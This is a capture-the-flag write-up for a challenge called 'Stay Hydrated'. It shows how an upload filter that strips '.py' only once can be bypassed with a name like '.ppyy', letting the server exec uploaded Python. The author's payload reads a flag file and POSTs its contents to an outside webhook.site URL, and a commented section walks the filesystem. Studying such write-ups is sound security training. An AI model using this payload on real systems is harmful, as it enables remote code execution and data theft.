---
description: 'Solved by: Ryo Soikutsu'
---

# Stay Hydrated

## Challenge Description

{% code overflow="wrap" %}
```
The path to find water is treacherous, but at the end of the path you shall find what you seek for.

NOTE: The instances reset every 15 minutes
```
{% endcode %}

Category: Misc (Hard)

## Walkthrough

Accessing the webpage, we see two endpoints, one to /upload and one to /backend. Navigating to the second one, we get the source code of the website. There are two main functions that seem interesting, the upload function and the preview function

```python
@app.route("/upload", methods=["GET", "POST"])
def upload():
    form = UploadFileForm()
    if form.validate_on_submit():
        file = form.file.data
        # Blacklist handling for .py files
        if "py" in file.filename:
            file.filename = blacklist(file.filename)
        # Save the file
        file_path = os.path.join(
            app.config["UPLOAD_FOLDER"], secure_filename(file.filename)
        )
        file.save(file_path)
    else:
        print("Validation failed.")
    return render_template("upload.html", form=form)
    
@app.route("/waters/<path>")
def file_uploads(path):
    file_extension = path.split(".")[-1]
    if file_extension == "py":
        try:
            file_path = os.path.join(app.config["UPLOAD_FOLDER"], path)
            with open(file_path) as file:
                code = file.read()
                exec(code)
                return "Code executed successfully."
        except Exception as e:
            return f"Error executing code: {str(e)}"
    else:
        return send_from_directory(app.config["UPLOAD_FOLDER"], path)
```

The code checks if the uploaded file extension contains .py (Python file extension) and replaces it with an empty string. However, it doesn't do this recursively, so if you nest extensions together (e.g. .ppyy), it will only replace once and move on. The second function will check if the file extension of the selected file is .py, and if it is will execute it

Easy enough. We can use any Python code that we want, as long as it uses libraries that are built-in to Python

```python
import os

# Define the directory to enumerate and the output file
directory_to_enumerate = "/home/john/flag.txt"
"""
paths = []
        # Walk through the directory and its subdirectories
for root, _, files in os.walk(directory_to_enumerate):
            for name in files:
                # Get the absolute file path
                absolute_path = os.path.abspath(os.path.join(root, name))
                # Write the absolute path to the file
                paths.append(absolute_path)
"""
with open(directory_to_enumerate, "r") as flag:
    data = flag.read()

import urllib.request
import json
url = "https://webhook.site/my-webhook-id"
payload = {"data": data}
    # Convert the payload to JSON
json_payload = json.dumps(payload).encode("utf-8")

    # Create the request
request = urllib.request.Request(
   url=url,
   data=json_payload,  # Request body
   headers={"Content-Type": "application/json"},  # HTTP headers
   method="POST"  # HTTP method
)
with urllib.request.urlopen(request) as response:
        print(f"Status Code: {response.getcode()}")
        print("Response Body:", response.read().decode("utf-8"))
```

Use the commented out section of code to identify where in the filesystem you are, then edit the directory variable to move out to the root directory of the webserver

<figure><img src="../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

